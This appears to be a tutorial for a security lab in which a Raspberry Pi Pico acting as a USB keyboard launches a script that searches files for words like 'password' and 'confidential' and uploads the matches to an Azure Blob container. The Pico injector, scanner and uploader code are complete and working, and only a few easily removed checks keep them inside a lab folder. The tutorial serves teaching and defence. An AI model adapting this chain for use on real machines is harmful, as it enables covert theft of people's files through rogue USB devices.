# **AZURE-DATA-DEALER**

Raspberry Pi Pico USB HID \+ Azure Blob Storage Security Lab

A deliberately constrained educational project that demonstrates how a USB HID device can trigger a pre-installed host script, discover synthetic files inside specific directories only, and upload matching test data to a private Azure Blob Storage container.

*Safe-by-design • Reproducible • Beginner-friendly*

*For Educational Use Only*

# **Ethics and Use**

Azure Data Dealer is intended for controlled learning environments, personal lab systems, classroom demonstrations, and explicitly authorized security testing. Do not adapt the project to search arbitrary user directories, collect real credentials, conceal activity, bypass security controls, or transfer data from systems you do not own or have permission to test.

| Project principle: Keep the demonstration useful by making the boundaries obvious, reproducible, and difficult to accidentally escape. |
| :---- |

# **1\. Project Overview**

Azure Data Dealer is a controlled cybersecurity lab built around a Raspberry Pi Pico running CircuitPython. The Pico presents itself to Windows as a USB HID keyboard. When connected, it opens a deliberately installed batch file on the test machine (but this can be deployed). That batch file launches a Python script that scans only a dedicated lab directory, E:\\FileLab\\data, for synthetic files containing selected keywords. Matching files are then uploaded to a private Azure Blob Storage container.

The purpose is not to create a real data-stealing device. The project demonstrates the mechanics of HID automation, host-side file discovery, cloud storage, authentication, and defensive controls in a repeatable lab.

| Important: The Raspberry Pi Pico does not perform the Azure network upload itself. The Pico only sends keystrokes. The Windows host runs Python and performs the HTTPS upload to Azure. |
| :---- |

# **2\. Learning Objectives**

* Understand how a Raspberry Pi Pico can emulate a USB keyboard using CircuitPython and adafruit\_hid.  
* Understand the difference between HID-triggered execution and host-side program execution.  
* Build a deliberately constrained file discovery routine using Python.  
* Upload test files to Azure Blob Storage using the official Azure Python SDK through CMD.  
* Handle Azure credentials without committing secrets to GitHub.  
* Document a security experiment with clear boundaries, expected behavior, and defensive observations.

# **3\. Architecture**

      Raspberry Pi Pico  
            |  
            | USB HID keystrokes  
            v  
      Windows test machine  
            |  
            | launches E:\\FileLab\\run\_demo.bat  
            v  
      Python host script  
            |  
            | scans ONLY E:\\FileLab\\data  
            | matches synthetic keywords  
            v  
      Azure SDK over HTTPS  
            |  
            v  
      Private Azure Blob Storage container

This architecture intentionally separates the HID device from the network operation. The Pico is the trigger; Windows is the execution environment; Azure is the destination for controlled test data.

# **4\. Safety Boundaries**

The lab should remain safe even if the script is launched accidentally. The host script therefore includes multiple boundaries:

* The scan root is fixed to E:\\FileLab\\data.  
* A marker file at E:\\FileLab\\.ducky\_lab\_marker must exist or the script stops.  
* Only .txt, .csv, .json, and .md files are considered.  
* Files larger than 512 KB are skipped.  
* The code verifies that resolved file paths stay inside the lab directory.  
* The sample data should be completely synthetic and contain no real credentials, personal data, tokens, or secrets.  
* Azure credentials are read from an environment variable rather than hard-coded into the repository.

| Scope rule: Use this project only on computers and Azure resources you own or are explicitly authorized to test. |
| :---- |

# **5\. Prerequisites**

| Component | Requirement |
| :---- | :---- |
| Raspberry Pi | Raspberry Pi Pico with CircuitPython installed |
| CircuitPython library | adafruit\_hid installed in CIRCUITPY\\lib |
| Host OS | Windows test machine |
| Python | Python 3.9 or newer recommended |
| Azure | Azure Storage Account with a private Blob container |
| Python package | azure-storage-blob |
| Lab directory | E:\\FileLab |

# **6\. Azure Setup**

## **6.1 Create the Blob container**

In the Azure Portal, open your Storage Account, go to Data storage → Containers, and create a container named:

ducky-lab

Keep anonymous access disabled so that the container remains private.

## **6.2 Install the Azure Python SDK**

Open Command Prompt on the Windows test machine and run: 

      py \-m pip install azure-storage-blob

*This can be run as part of a self-recycling .py for new machines that do not have Azure Python SDK installed.*

## **6.3 Configure the connection string**

For this beginner lab, store the Storage Account connection string in a Windows environment variable. Do not place the connection string inside the Python source code.

      setx AZURE\_STORAGE\_CONNECTION\_STRING "PASTE-YOUR-CONNECTION-STRING-HERE"

Close that Command Prompt window and open a new one before testing the Python script.

# **7\. Build the Lab Directory**

Create the following structure on the E: drive:

      E:\\FileLab  
      │  
      ├── .ducky\_lab\_marker  
      ├── upload\_demo.py  
      ├── run\_demo.bat  
      └── data  
          ├── sensitive\_data.txt  
          ├── holiday.txt  
          ├── company\_confidential.txt  
          ├── shopping\_list.txt  
          └── accounts.csv

The .ducky\_lab\_marker file can be empty. Its presence is simply a safety signal that confirms the script is running inside the intended training directory.

## **7.1 Example synthetic data**

Example for E:\\FileLab\\data\\sensitive\_data.txt:

      THIS IS FAKE LAB DATA
      
      Customer: Example User  
      Account: 12345678  
      Password: DefinitelyNotARealPassword

Example for E:\\FileLab\\data\\accounts.csv:

      username,password  
      testuser1,fakepassword123  
      testuser2,notreal456

# **8\. Host Scanner and Azure Uploader**

Save the following as E:\\FileLab\\upload\_demo.py. The code intentionally refuses to roam outside the lab directory.

      from pathlib import Path  
      from datetime import datetime, timezone  
      import os
      
      from azure.storage.blob import BlobServiceClient

      \# \------------------------------------------------------------  
      \# LAB SAFETY SETTINGS  
      \# \------------------------------------------------------------
      
      LAB\_ROOT \= Path(r"E:\\FileLab").resolve()  
      DATA\_FOLDER \= (LAB\_ROOT / "data").resolve()  
      MARKER\_FILE \= LAB\_ROOT / ".ducky\_lab\_marker"
      
      CONTAINER\_NAME \= "ducky-lab"
      
      KEYWORDS \= \[  
          "sensitive",  
          "sensitive data",  
          "confidential",  
          "secret",  
          "password",  
      \]
      
      ALLOWED\_EXTENSIONS \= {  
          ".txt",  
          ".csv",  
          ".json",  
          ".md",  
      }
      
      MAX\_FILE\_SIZE \= 512 \* 1024
      
      \# \------------------------------------------------------------  
      \# SAFETY CHECKS  
      \# \------------------------------------------------------------
      
      EXPECTED\_ROOT \= Path(r"E:\\FileLab").resolve()
      
      if LAB\_ROOT \!= EXPECTED\_ROOT:  
          raise RuntimeError("Safety check failed: unexpected lab directory.")
      
      if not MARKER\_FILE.exists():  
          raise RuntimeError("Safety marker missing. Refusing to scan.")
      
      if not DATA\_FOLDER.exists():  
          raise RuntimeError(r"E:\\FileLab\\data does not exist.")
      
      \# \------------------------------------------------------------  
      \# CONNECT TO AZURE  
      \# \------------------------------------------------------------
      
      connection\_string \= os.getenv("AZURE\_STORAGE\_CONNECTION\_STRING")
      
      if not connection\_string:  
          raise RuntimeError(  
              "AZURE\_STORAGE\_CONNECTION\_STRING is not configured."  
          )
      
      blob\_service \= BlobServiceClient.from\_connection\_string(  
          connection\_string  
      )
      
      container \= blob\_service.get\_container\_client(CONTAINER\_NAME)
      
      \# \------------------------------------------------------------  
      \# SEARCH THE LAB DIRECTORY ONLY  
      \# \------------------------------------------------------------
      
      print()  
      print("=== Azure Data Dealer Lab \===")  
      print(f"Scanning ONLY: {DATA\_FOLDER}")  
      print()
      
      matches \= \[\]
      
      for file\_path in DATA\_FOLDER.rglob("\*"):

    if not file\_path.is\_file():  
        continue

    resolved\_file \= file\_path.resolve()

    \# Refuse a path that resolves outside the lab data folder.  
    if not resolved\_file.is\_relative\_to(DATA\_FOLDER):  
        print(f"SKIPPED (outside lab root): {file\_path.name}")  
        continue

    if file\_path.suffix.lower() not in ALLOWED\_EXTENSIONS:  
        continue

    file\_size \= file\_path.stat().st\_size

    if file\_size \> MAX\_FILE\_SIZE:  
        print(f"SKIPPED (too large): {file\_path.name}")  
        continue

    searchable\_filename \= (  
        file\_path.name  
        .lower()  
        .replace("\_", " ")  
        .replace("-", " ")  
    )

    filename\_hits \= \[  
        word for word in KEYWORDS  
        if word in searchable\_filename  
    \]

    try:  
        contents \= file\_path.read\_text(  
            encoding="utf-8",  
            errors="ignore"  
        ).lower()  
    except Exception:  
        contents \= ""

    content\_hits \= \[  
        word for word in KEYWORDS  
        if word in contents  
    \]

    hits \= sorted(set(filename\_hits \+ content\_hits))

    if hits:  
        matches.append((file\_path, hits))

      \# \------------------------------------------------------------  
      \# DISPLAY AND UPLOAD MATCHES  
      \# \------------------------------------------------------------
      
      print(f"Found {len(matches)} matching lab file(s).")  
      print()
      
      timestamp \= datetime.now(  
          timezone.utc  
      ).strftime("%Y%m%dT%H%M%SZ")
      
      for file\_path, hits in matches:

    relative\_path \= file\_path.relative\_to(DATA\_FOLDER)

    blob\_name \= (  
        f"{timestamp}/"  
        \+ str(relative\_path).replace("\\\\", "/")  
    )

    print(f"MATCH: {relative\_path}")  
    print(f"Keywords: {', '.join(hits)}")  
    print(f"Uploading as: {blob\_name}")

    with open(file\_path, "rb") as file\_data:  
        container.upload\_blob(  
            name=blob\_name,  
            data=file\_data,  
            overwrite=True  
        )

    print("Uploaded successfully.")  
    print()

      print("=== Lab complete \===")

# 

# **9\. Batch Launcher** #

Save this as E:\\FileLab\\run\_demo.bat:

      @echo off
      
      echo \======================================  
      echo Azure Data Dealer \- Security Lab  
      echo \======================================
      
      py E:\\FileLab\\upload\_demo.py
      
      echo.  
      echo Demo finished.  
      pause

# **10\. Raspberry Pi Pico code.py**

The Pico's job is intentionally simple: wait for Windows to recognize the HID device, open the Run dialog, and launch the lab batch file.

      import time  
      import usb\_hid
      
      from adafruit\_hid.keyboard import Keyboard  
      from adafruit\_hid.keyboard\_layout\_us import KeyboardLayoutUS  
      from adafruit\_hid.keycode import Keycode
      
      keyboard \= Keyboard(usb\_hid.devices)  
      layout \= KeyboardLayoutUS(keyboard)
      
      \# Give Windows time to recognize the Pico.  
      time.sleep(3)
      
      \# Open the Windows Run dialog.  
      keyboard.press(Keycode.WINDOWS, Keycode.R)  
      keyboard.release\_all()
      
      time.sleep(1)
      
      \# Launch the deliberately installed lab program.  
      layout.write(r"E:\\FileLab\\run\_demo.bat")
      
      keyboard.press(Keycode.ENTER)  
      keyboard.release\_all()

# **11\. End-to-End Test**

1. Confirm E:\\FileLab\\.ducky\_lab\_marker exists.  
2. Confirm all files under E:\\FileLab\\data contain synthetic test information only.  
3. Confirm the Azure container named ducky-lab exists and is private.  
4. Open a fresh Command Prompt and verify AZURE\_STORAGE\_CONNECTION\_STRING is available.  
5. Run py E:\\FileLab\\upload\_demo.py manually first.  
6. Check the Azure Blob container for the expected timestamped uploads.  
7. Only after the manual test works, connect the Pico and allow it to launch E:\\FileLab\\run\_demo.bat.

## **11.1 Expected result**

      \=== Azure Data Dealer Lab \===  
      Scanning ONLY: E:\\FileLab\\data
      
      Found 3 matching lab file(s).
      
      MATCH: sensitive\_data.txt  
      Keywords: password, sensitive, sensitive data  
      Uploading as: 20260913T055000Z/sensitive\_data.txt  
      Uploaded successfully.
      
      MATCH: company\_confidential.txt  
      Keywords: confidential  
      Uploading as: 20260913T055000Z/company\_confidential.txt  
      Uploaded successfully.
      
      MATCH: accounts.csv  
      Keywords: password  
      Uploading as: 20260913T055000Z/accounts.csv  
      Uploaded successfully.
      
      \=== Lab complete \===

# **13\. Defensive Security Takeaways**

* USB devices that identify as keyboards can generate trusted-looking input without installing a conventional driver.  
* The HID device itself may be extremely simple; the meaningful behavior often occurs in host-side commands or scripts.  
* Application allow-listing, endpoint protection, least privilege, and USB device controls can reduce the risk of unauthorized HID activity.  
* Outbound network monitoring can reveal unexpected uploads even when the initial trigger is local USB input.  
* Secrets should be stored outside source code and repositories.  
* A good security demonstration documents both offensive mechanics and defensive observations.

# **14\. Troubleshooting**

| Problem | Check |
| :---- | :---- |
| Pico does nothing | Confirm CircuitPython is running, adafruit\_hid is installed, and increase the initial time.sleep(3) delay. |
| Run dialog opens but batch file is not found | Confirm the path is exactly E:\\FileLab\\run\_demo.bat and the E: drive is mounted. |
| Python says azure.storage.blob is missing | Run: py \-m pip install azure-storage-blob |
| Connection string is missing | Open a new Command Prompt after setx and verify the environment variable exists. |
| No files upload | Confirm the sample files contain one of the configured keywords and use an allowed extension. |
| Safety marker error | Create an empty file named .ducky\_lab\_marker directly inside E:\\FileLab. |

# **15\. Future Extensions Concepts**

* Store upload metadata in Azure SQL while keeping file contents in Blob Storage.  
* Record filename, keyword match, file size, timestamp, and Blob path for each test upload.  
* Add a dry-run mode that reports matches without uploading anything.  
* Add SHA-256 hashes so the lab can demonstrate file integrity and evidence tracking.  
* Add an Azure Function or Logic App that records or visualizes lab uploads.  
* Add a physical push button to the Pico so the HID action requires deliberate local interaction.  
* Add a defensive companion section showing relevant Windows and Azure logs generated by the experiment.
